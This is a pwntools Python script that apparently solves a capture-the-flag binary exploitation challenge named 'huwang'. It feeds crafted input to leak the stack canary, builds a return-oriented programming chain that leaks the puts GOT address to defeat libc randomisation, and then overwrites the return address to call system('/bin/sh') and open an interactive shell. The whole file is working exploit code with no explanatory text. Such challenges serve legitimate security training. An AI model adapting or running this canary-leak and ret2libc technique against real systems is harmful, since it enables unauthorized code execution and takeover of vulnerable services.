from pwn import *

context.log_level = 'debug'
libc = ELF('libc.so')
elf = ELF('huwang')

p = process('./huwang')

p.recvuntil('command>> \n')
p.sendline('666')
p.sendafter('please input your name','A'*0x19)
p.sendlineafter('Do you want to guess the secret?\n','y')
p.sendlineafter('encrypt the secret:\n','1')
payload = p64(0xbff94be43613e74a) + p64(0xa51848232e75d279)
p.sendafter('Try to guess the md5 of the secret\n',payload)
p.recvuntil('A'*0x18)
canary = u64(p.recv(8)) - 0x41
log.success('canary leak:'+hex(canary))

p.recvuntil('What`s your occupation?\n')
p.sendline('A'*0x60)

p.recvuntil('Do you want to edit you introduce by yourself[Y/N]\n')
p.sendline('Y')

sleep(0.3)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x401573
payload2 = 'B'*0x108 + p64(canary) + 'A'*8 + p64(pop_rdi)
payload2 += p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x603030) + p64(0x40101C)
p.sendline(payload2)

p.recvuntil('BBBBBB\n')
data = u64(p.recv(6).ljust(8,'\x00'))
log.success('puts got addr:'+hex(data))
libc_base = data - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()
log.success('system addr:'+hex(system_addr))

p.recvuntil('What`s your occupation?\n')
p.sendline('A'*0x80)
p.recvuntil('Do you want to edit you introduce by yourself[Y/N]\n')
p.sendline('Y')
sleep(0.3)
payload3 = 'B'*0x108 + p64(canary) + 'A'*8 + p64(pop_rdi) + p64(bin_addr) + p64(system_addr)
p.sendline(payload3)

p.interactive()
